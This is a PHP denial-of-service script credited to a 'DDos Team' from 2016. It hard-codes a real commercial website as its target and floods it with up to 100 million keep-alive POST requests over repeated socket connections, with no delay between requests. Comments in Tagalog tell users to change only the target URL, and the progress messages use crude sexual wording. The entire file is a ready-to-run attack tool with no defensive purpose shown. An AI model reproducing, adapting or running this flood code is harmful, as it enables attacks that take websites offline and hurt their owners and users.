<?php

// MCA and PHU DDos Team 2016

$target_url = "https://www.boxbrownie.com/"; // Eto lang galawin nyo

// Wag na po ito pakielaman please lang

$max_requests = 100000000;

$max_requests_per_connection = 100;

$delay_between_connections = 0;

$delay_between_requests = 0;

$skip_check = 0;

$useragent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
if($_SERVER['SERVER_PROTOCOL']){

	$output_to_browser = 1;
} else {
	$output_to_browser = 0;
}
if($output_to_browser == 1){
	set_time_limit(0); 


	$lb = "<br>\n"; 

	

                echo "+-+-+-+-+-+-+ +-+-+-+-+-+".$lb;
 		echo "|M|C|A|&|P|H|U| |D|D|O|S|".$lb;
		echo "+-+-+-+-+-+-+ +-+-+-+-+-+".$lb;
	;
} else {
	set_time_limit(0); 
	$lb = "\n"; 
	    

                echo "+-+-+-+-+-+-+ +-+-+-+-+-+".$lb;
 		echo "|M|C|A|&|P|H|U| |D|D|O|S|".$lb;
		echo "+-+-+-+-+-+-+ +-+-+-+-+-+".$lb;
}

function quick_rand(){
	$letters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
	$rand_string = '';
	for($i=0;$i<rand(4,12);$i++){
		$rand_string.=$letters[array_rand($letters)];
	}
	return($rand_string);
}

$target_url_parsed = parse_url($target_url);
$target_url = array();
$target_url['host'] = $target_url_parsed['host'];
@$target_url['path'] = $target_url_parsed['path'];
@$target_url['query'] = $target_url_parsed['query'];
@$target_url['port'] = $target_url_parsed['port'];
if(!$target_url['path']){
	$target_url['path'] = '/EN/Pages/Home.aspx';
}
if(!$target_url['port']){
	$target_url['port'] = 80;
}
if($target_url['query']){
	$request_url = $target_url['path']."?".$target_url['query'];
} else {
	$request_url = $target_url['path'];
}

if($skip_check != 1){
	
	$reply = '';
	$socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
	if(!$socket){
		die("Sadly Failed to Arouse the target ".$target_url['host']." on port ".$target_url['port'].$lb);
	}
	$request = "POST / HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".$useragent."\r\nConnection: Keep-Alive\r\n\r\n";
	fwrite($socket, $request);
	$incoming_data = '';
	while (!feof($socket)){
		$buffer=fgets($socket, 100);
		$reply.=$buffer;
			
		
		if($buffer == "\r\n"){
			@fclose($socket); break;
		}
	}
	
	
	
	if(strpos($reply, "Connection: close")){
		echo $target_url['host']." does not support Keep-Alive! max_requests_per_connection will be set to 1, making this a much slower attack.\n\n";
		$max_requests_per_connection = 1;
	}   	 
}


if($max_requests_per_connection > 100){ $max_requests_per_connection = 100; }
if($max_requests_per_connection < 1){ $max_requests_per_connection = 1; }

$max_connections = ceil($max_requests / $max_requests_per_connection);
for($c=0;$c<$max_connections;$c++){ //Stay within our max_connections limit
	echo "Arousing Target [".($c+1)."] to ".$target_url['host']."..";
	@$attack_socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
	if(!$attack_socket){
		echo "failed (".$errstr.")".$lb;
	} else {
		echo "success".$lb."Sending Sperms |";
		for($r=0;$r<$max_requests_per_connection;$r++){
			$request = "POST ".str_replace("%rand%", quick_rand(), $request_url)." HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".$useragent."\r\nConnection: Keep-Alive\r\n\r\n";
			@fwrite($attack_socket, $request);
			echo ".";
			usleep($delay_between_requests * 1000000); //Delay between requests
		}
		echo "|".$lb;
	}
	@fclose($attack_socket);
	echo "Sperm Penetrated".$lb;
usleep($delay_between_connections * 1000000);
}
?>